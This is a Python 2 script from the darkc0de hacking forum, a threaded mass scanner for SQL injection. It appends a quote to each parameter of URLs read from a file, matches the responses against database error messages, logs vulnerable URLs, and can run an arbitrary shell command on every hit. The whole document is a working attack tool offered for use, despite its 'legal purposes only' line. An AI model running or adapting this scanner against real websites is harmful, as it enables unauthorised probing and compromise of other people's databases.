#!/usr/bin/env python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
#
# This script was written by houbysoft (visit http://houbysoft.com/ for more info), (c) 2009.
# Thanks to : low1z for the list of SQL injection error messages and their respective databases,
# d3hydr8 for making such a nice forum and all forum.darkc0de.com members and you, the user!
# This script is available under the GPLv3 License.
# USE COMPLETELY ON YOUR OWN RISK.


import urllib2,sys,random,re,time,string
from threading import Thread
from time import sleep
from os import system



class sqli(Thread):
  def __init__ (self,url,cmd):
    Thread.__init__(self)
    self.url = url
    self.cmd = cmd
  def run(self):
    test_sqli(self.url,self.cmd)



def welcome():
    print "[-] Welcome to SQL injection tester by houbysoft"
    print "    This program is available under the terms of the GPLv3."
    print "    (c) 2009 houbysoft, http://houbysoft.com/"
    print "    http://forum.darkc0de.com"
    print "    USE ALLOWED FOR LEGAL PURPOSES ONLY!"



def usage():
    print "[h] Usage : ./sqlic.py URLFILE [-t=timeout] [-x=cmd]"
    print "[h]   URLFILE : file with URLs to check"
    print "[h]   timeout : the time that this program sleeps until creating each new thread"
    print "[h]             If not set, defaults to 2."
    print "[h]     cmd   : the command to execute on each vulnerable URL found. %url% will be replaced by the vulnerable URL"



def found(cmd,url,type_):
    url = url[:-1] # remove the quote
    file = open("sqliclog.txt","a")
    file.write(url+"\n")
    file.close()
    print "\n[+] Found : "+url+" ("+type_+")"
    if cmd:
      cmd = cmd.replace("%url%","\""+url+"\"")
      print "    -> running command: "+cmd
      system(cmd)



def test_sqli(url,cmd):
  print '*',
  inj = "'"
  variables = url.split("/")
  base_url = url.split("?")
  base_url = base_url[0] + "?"
  if base_url in URLS:
    return
  else:
    URLS.append(base_url)
  variables = variables[-1]
  variables = variables.split("?")
  variables = variables[-1]
  variables = variables.split("&")
  try:
   for x in variables:
    url = base_url
    for y in variables:
      if x != y:
        url = url + y
        url = url + "&"
    url = url + x + inj
    text = urllib2.urlopen(url).read()
    if text.find("error in your SQL syntax") != -1:
        found(cmd,url,"MySQL")
        return
    if text.find("ORA-01756") != -1:
        found(cmd,url,"Oracle")
        return
    if text.find("Error Executing Database Query") != -1:
        found(cmd,url,"JDBC_CFM")
        return
    if text.find("SQLServer JDBC Driver") != -1:
        found(cmd,url,"JDBC_CFM2")
        return
    if text.find("Microsoft OLE DB Provider for SQL Server") != -1:
        found(cmd,url,"MSSQL_OLEdb")
        return
    if text.find("Unclosed quotation mark") != -1:
        found(cmd,url,"MSSQL_Uqm")
        return
    if text.find("ODBC Microsoft Access Driver") != -1:
        found(cmd,url,"MS-Access_ODBC")
        return
    if text.find("Microsoft JET Database") != -1:
        found(cmd,url,"MS-Access_JETdb")
        return
    if text.find("supplied argument is not a valid MySQL result resource") != -1:
        found(cmd,url,"MySQL")
        return
   return
  except:
    return



def main():
    welcome()
    if len(sys.argv) < 2:
      usage()
      quit()
    tts = 2
    cmd = ""
    for x in sys.argv:
      if x.find("-x=") != -1:
        cmd = x[3:]
      if x.find("-t=") != -1:
        tts = int(x[3:])
    print "[+] Starting : \n  URL_FILE = "+sys.argv[1]+"\n  TTS = "+repr(tts)+"\n  CMD = "+cmd
    file = open(sys.argv[1],"r")
    str = file.readline()
    while str:
        if str[-1] == "\n":
            str = str[:-1]
        t = sqli(str,cmd)
        t.start()
	str = file.readline()
	sleep(tts)
    file.close()


URLS = []
main()
